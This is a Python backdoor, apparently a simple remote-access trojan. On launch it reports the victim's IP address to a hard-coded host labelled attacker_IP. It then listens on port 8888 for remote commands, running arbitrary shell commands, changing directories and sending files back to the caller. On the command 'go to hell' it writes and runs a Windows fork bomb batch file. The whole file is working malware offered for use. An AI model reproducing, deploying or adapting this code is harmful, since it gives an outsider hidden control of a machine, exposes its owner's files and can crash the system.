import socketserver
import subprocess
import socket
import os
import json
addr = (socket.gethostbyname(socket.gethostname()), 8888)

class MyServer(socketserver.BaseRequestHandler):
    
    def file_access(self, input):
        if input[1] == '..':
            cwd = os.getcwd()
            cwd = cwd.split("\\")
            newPath = cwd[0] + "//"
            newPath += "/".join(cwd[1:-1])
            os.chdir(newPath)
            return 'go'
        elif input[1] != '..':
            cwd = os.getcwd()
            print(cwd)
            cwd = cwd.split("\\")
            newPath = cwd[0] + "//"
            newPath += "/".join(cwd[1:])
            newPath += "/" + input[1]
            try:
                os.chdir(newPath)
            except FileNotFoundError:
                return 'nogo'
            
            return 'go'

    def get(self,input):
        if not input[1]: return "no"   
        else : 
            filename = input[1]
            try :
                open(filename, 'rb' )    
            except BaseException:
                return "no"
            else:
                return "yes"
            
    def handle(self):
        print("=================Connected Successfully==================")

        while True:  
            conn = self.request
            print("cmd starting....")
            conn.sendall(bytes('-------------cmd activated---------------', encoding='utf-8'))

            while True:
                client_bytes = conn.recv(1024)  
                client_str = str(client_bytes, 'utf-8')  
                split = client_str.split(" ")
                if split[0] == 'cd': 
                    re = self.file_access(split)
                    if re == 'go':
                        print("-->%s"%client_str)
                        result_bytes = bytes(' ', encoding='utf-8')
                        conn.sendall(bytes('info|1', encoding='utf-8'))  
                        conn.recv(1024)
                        conn.sendall(result_bytes)
                    else:
                        print("-->%s"%client_str)
                        result_bytes = bytes('No such directory!', encoding='utf-8')
                        conn.sendall(bytes('info|%d' % len(result_bytes), encoding='utf-8'))  
                        conn.recv(1024)
                        conn.sendall(result_bytes)
                elif split[0] == 'get': 
                    re = self.get(split)
                    if(re == "yes"):
                        filename = split[1]
                        myfile = open(filename, 'rb' ) 
                        basefilename = os.path.basename(filename)        
                        print (basefilename)  
                        myfile_size = os.path.getsize(filename)  
                        data = { 'filename' :basefilename, 'filesize' :myfile_size}  
                        json_obj = json.dumps(data)  
                        conn.sendall(json_obj.encode())  
                        for  readline  in  myfile:  
                            conn.sendall(readline)  
                        print ( 'file send is finish' ) 
                    if(re == "no"):
                        print("-->%s"%client_str)
                        get_bytes = bytes('No finish!', encoding='utf-8')
                        conn.sendall(get_bytes)  
                elif client_str == 'go to hell':
                    with open("down.bat","w+") as p:
                        p.write("%0|%0")
                    os.system('down.bat')
                    print("-->%s"%client_str)                   
                    conn.sendall(bytes('info|Down!!!!!', encoding='utf-8')) 
                    conn.recv(1024)
                else:
                    print(split[0])
                    print("-->%s"%client_str)
                    result_str = subprocess.getoutput(client_str)   
                    result_bytes = bytes(result_str, encoding='utf-8') 
                    conn.sendall(bytes('info|%d' % len(result_bytes), encoding='utf-8')) 
                    conn.recv(1024) 
                    conn.sendall(result_bytes)
            

            conn.close

    
    

def sendIP(ip):
    sk = socket.socket()
    sk.connect(ip)
    sk.sendall(bytes(addr[0], 'utf-8'))
    sk.close()

if __name__ == '__main__':
    attacker_IP = '120.125.70.120'
    print ('Server start at: %s: %s' %addr)
    print ('wait for connection...')   
    ip_port = (attacker_IP, 9999)
    sendIP(ip_port)
    print("Ready to Connect!")
    server = socketserver.ThreadingTCPServer(addr, MyServer)
    server.serve_forever()  